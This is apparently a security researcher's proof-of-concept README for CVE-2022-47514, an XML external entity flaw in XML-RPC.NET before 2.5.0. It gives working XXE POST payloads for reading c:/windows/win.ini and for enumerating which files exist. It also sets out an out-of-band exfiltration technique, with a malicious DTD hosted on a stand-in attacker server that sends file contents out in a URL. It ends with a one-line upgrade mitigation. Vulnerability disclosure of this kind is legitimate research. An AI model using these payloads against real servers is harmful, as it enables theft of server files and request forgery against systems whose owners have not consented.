# [CVE-2022-47514] Proof of Concept: XML-RPC.NET XXE File Exfiltration
**CVE (+Exploit) Author:** Farzan Karimi

**CVE Summary:**  An XML external entity (XXE) injection vulnerability in http://XML-RPC.NET before 2.5.0 allows remote authenticated users to conduct server-side request forgery (SSRF) attacks, as demonstrated by a pingback.aspx POST request. While the POST response initially appears to be a limited XXE file enumeration vulnerability, it can be elevated to full file exfiltration.

**CVE Details:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-47514

# PoC for CookComputing XML-RPC.NET XXE <2.5.0
1. Identify a vulnerable pingback.aspx endpoint. Identifying pingback endpoints with "CookComputing" <2.5 version footers tend to be strong signals.

![xml-rpc-1](https://user-images.githubusercontent.com/3679232/207168120-9465cd3d-2f3d-4ae0-b308-090de2b2501f.png)

2. Leverage the following XXE POST payload:

```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
"file://c:/windows/win.ini">]><foo>&xxe;</foo> 
```

3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")

![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207168416-9c801f2f-27ca-47c4-a5df-a4f66af98a58.png)

4. Request an existent file on the remote server (e.g. "win.ini"). Note the error message is different when requesting access to an existing file. This validates our XXE is working as intended.

![xml-rpc-3](https://user-images.githubusercontent.com/3679232/207167024-7338126f-6736-4f14-9a64-b6a0ecc7417e.png)

# 12/29 Update: File Exfiltration

*Summary:* Some XXEs don't directly return file contents in HTTP server responses. These cases don't actually demonstrate the true impact of exploitation, or the ability to exfiltrate file data. The following steps demonstrate how an attacker can still achieve file exfiltration via XXE on XML-RPC.NET by hosting a malicious DTD on a system they control, and then invoke the external DTD from within the in-band XXE payload. 

5. Host a malicious DTD on a file server the attacker controls. The system should host a malicious XML, containing:

```
<!ENTITY % meta "<!ENTITY serverfile SYSTEM 'https://attacker.server/public/evil.xml?r=%winfile;'>">  
%meta; 

```

When this XML document is parsed, the token &winfile; will be replaced with the contents of the win.ini file of the system where the parsing took place. The entity “winfile” in this XML document is an example of an external entity since it’s read from a separate resource. In cases where user-controlled XML is parsed on a server and the XML is then reflected to the user, this can allow malicious users to see the contents of privileged files on the server itself.

6. Craft the POST payload to post the entity as a variable to your server, as so:

```
<?xml version="1.0"?> 

<!DOCTYPE doc PUBLIC "blah" "https://attacker.server/public/evil.xml" [ 
  <!ENTITY % winfile SYSTEM "file://c:/windows/win.ini"> 
]> 

<doc> 
  &serverfile; 
</doc> 
```

Burp request:
![xxe-exfil-payload](https://user-images.githubusercontent.com/3679232/210012497-d0ed37f8-3e95-4231-971d-03a83629c1f8.png)


7. Because the parameter entity token is being used in a normal literal which then composes a system literal, it is parsed and expanded. This makes a request to a URL like:

```
http://www.attacker.server/?r=;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1%0D%0A%5BMCI%20Extensions.BAK%5D%0D%0Am2v=MPEGVideo%0D%0Amod=MPEGVideo
```

And the targetted file (e.g. win.ini) is exfiltrated and written to the attacker's web log:

![xxe-data-exfil](https://user-images.githubusercontent.com/3679232/210012160-eab20862-cd15-4c6a-aa29-41001ec17519.png)

Note: if using Azure to host your evil XML (external DTD), it may take time for the file to appear in the Azure web logs. Based on experience, replaying the request multiple times may trigger Azure garbage collection to update the logs sooner.

# Mitigation
Installations using a version prior to version 2.5.0 should update to version 2.5.0. This mitigation disables XML entity expansion.
